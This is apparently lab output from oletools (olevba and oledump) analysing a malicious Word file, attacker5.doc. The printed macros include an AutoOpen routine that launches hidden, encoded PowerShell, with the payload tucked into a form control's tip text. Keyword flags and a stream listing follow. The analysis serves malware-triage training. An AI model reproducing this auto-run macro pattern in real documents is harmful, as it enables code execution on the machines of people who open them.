ywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: attacker5.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: attacker5.doc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: attacker5.doc - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    Shell "powershell -nop -w hidden -encodedcommand " & CatchMeIfYouCan.SquidGame.ControlTipText
End Sub
-------------------------------------------------------------------------------
VBA MACRO CatchMeIfYouCan.frm 
in file: attacker5.doc - OLE stream: 'Macros/VBA/CatchMeIfYouCan'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub SquidGame_Click()

End Sub

Private Sub CatchMeIfYouCan_Click()

End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'attacker5.doc' - OLE stream: 'Macros/CatchMeIfYouCan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CheckBox1
-------------------------------------------------------------------------------
VBA FORM Variable "b'SquidGame'" IN 'attacker5.doc' - OLE stream: 'Macros/CatchMeIfYouCan'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |SquidGame_Click     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|powershell          |May run PowerShell commands                  |
|Suspicious|encodedcommand      |May run PowerShell commands                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

ubuntu@ip-10-10-65-135:~/Desktop/maldocs$ oledump.py attacker5.doc
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      7157 '1Table'
  5:        97 'Macros/CatchMeIfYouCan/\x01CompObj'
  6:       313 'Macros/CatchMeIfYouCan/\x03VBFrame'
  7:      7566 'Macros/CatchMeIfYouCan/f'
  8:        84 'Macros/CatchMeIfYouCan/o'
  9:       557 'Macros/PROJECT'
 10:       113 'Macros/PROJECTwm'
 11: M    1473 'Macros/VBA/CatchMeIfYouCan'
 12: M     994 'Macros/VBA/Module1'
 13: m     924 'Macros/VBA/ThisDocument'
 14:      3394 'Macros/VBA/_VBA_PROJECT'
 15:       889 'Macros/VBA/dir'
 16:      4096 'WordDocument'
